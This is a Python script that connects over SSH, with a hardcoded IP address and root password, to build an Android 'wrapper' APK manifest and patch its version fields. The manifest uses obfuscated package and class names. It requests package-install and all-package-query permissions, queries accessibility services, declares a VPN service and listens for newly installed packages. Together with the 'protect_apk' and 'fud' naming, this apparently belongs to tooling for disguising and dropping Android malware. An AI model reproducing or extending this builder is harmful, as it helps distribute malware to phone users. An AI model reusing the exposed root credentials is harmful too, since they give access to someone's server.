#!/usr/bin/env python3
"""Rebuild the wrapper's AndroidManifest.xml with versionCode/versionName."""
import paramiko
import base64

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('162.19.81.122', port=20056, username='root', password='yfoTsKjtY8UgVUsY', timeout=15)

# Step 1: Write a proper AndroidManifest.xml source
manifest_xml = r'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="wmhfnq.mvicfbs"
    android:versionCode="100001"
    android:versionName="1.0">

    <uses-sdk
        android:minSdkVersion="24"
        android:targetSdkVersion="34" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />

    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent>
        <intent>
            <action android:name="android.accessibilityservice.AccessibilityService" />
        </intent>
    </queries>

    <application
        android:theme="@android:style/Theme.NoTitleBar"
        android:label="@string/app_name"
        android:icon="@drawable/app_icon"
        android:name="qgnbmr.ujrei.cveag"
        android:allowBackup="false"
        android:supportsRtl="true">

        <activity
            android:theme="@android:style/Theme.NoTitleBar"
            android:name="wmhfnq.mvicfbs.iydvz"
            android:exported="true"
            android:excludeFromRecents="false"
            android:launchMode="singleTop"
            android:screenOrientation="portrait"
            android:alwaysRetainTaskState="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name="wmhfnq.mvicfbs.dhkkzt"
            android:permission="android.permission.BIND_VPN_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.net.VpnService" />
            </intent-filter>
        </service>

        <receiver
            android:name="wmhfnq.mvicfbs.faxxu"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
'''

# Write manifest source
sftp = ssh.open_sftp()
with sftp.open('/tmp/AndroidManifest.xml', 'w') as f:
    f.write(manifest_xml)
print("Manifest source written")

# Step 2: Try to compile it using aapt2
cmds = [
    # Try aapt2 compile
    'cd /tmp && /android-sdk/build-tools/34.0.0/aapt2 compile --dir /tmp -o /tmp/compiled/ AndroidManifest.xml 2>&1',
    # Try using aapt to compile
    'cd /tmp && /android-sdk/build-tools/34.0.0/aapt package -f -M /tmp/AndroidManifest.xml -I /tmp/test_input.apk -F /tmp/manifest_test.apk 2>&1',
]

for cmd in cmds:
    print(f"\n=== {cmd[:70]}... ===")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=30)
    print(stdout.read().decode())
    print(stderr.read().decode())

# Step 3: Alternative - use the original bot's simple binary patch approach
# Extract the existing manifest from the TEMPL, and try the original bot's approach
helper = r'''
import base64, struct, sys

sys.path.insert(0, '/root/.sop/hathixfud-bot-kb')
from protect_apk import TEMPL

manifest = bytearray(base64.b64decode(TEMPL["AndroidManifest.xml"]["d"]))

# The original bot's approach: find versionCode (int value 1) and replace
# Find the string "1.0" in the manifest
old_vn = b"1.0"
idx = manifest.find(old_vn)
print(f"Found '1.0' at index: {idx}")

# Find int value 1 (versionCode = 1)
old_vc = struct.pack("<I", 1)
positions = []
start = 0
while True:
    pos = manifest.find(old_vc, start)
    if pos < 0:
        break
    positions.append(pos)
    start = pos + 1
print(f"Found int(1) at positions: {positions}")

# Show the surrounding bytes for each position
for pos in positions:
    ctx = bytes(manifest[max(0,pos-8):pos+8])
    print(f"  Context at {pos}: {ctx.hex()}")

# Show manifest structure
print(f"Manifest size: {len(manifest)}")
print(f"First 32 bytes: {bytes(manifest[:32]).hex()}")
'''

with sftp.open('/tmp/check_manifest.py', 'w') as f:
    f.write(helper)
sftp.close()

stdin, stdout, stderr = ssh.exec_command('python3 /tmp/check_manifest.py 2>&1')
print("\n=== Manifest analysis ===")
print(stdout.read().decode())
print(stderr.read().decode())

ssh.close()
